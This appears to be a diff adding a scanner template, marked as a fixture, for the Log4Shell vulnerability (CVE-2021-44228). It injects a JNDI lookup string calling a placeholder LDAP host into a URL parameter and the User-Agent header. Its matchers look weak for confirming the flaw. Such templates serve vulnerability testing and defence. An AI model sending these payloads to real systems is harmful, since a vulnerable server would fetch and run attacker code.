@@ -1,0 +1,24 @@
+id: log4shell-fixture
+info:
+  name: Log4Shell (CVE-2021-44228) (fixture)
+  severity: critical
+  classification:
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-502
+  tags: cve,rce,log4j,apache
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?param=${jndi:ldap://example.test/a}"
+    headers:
+      User-Agent: "${jndi:ldap://example.test/a}"
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "set-cookie:"
+        case-insensitive: true
+        negative: true
+      - type: status
+        status:
+          - 200
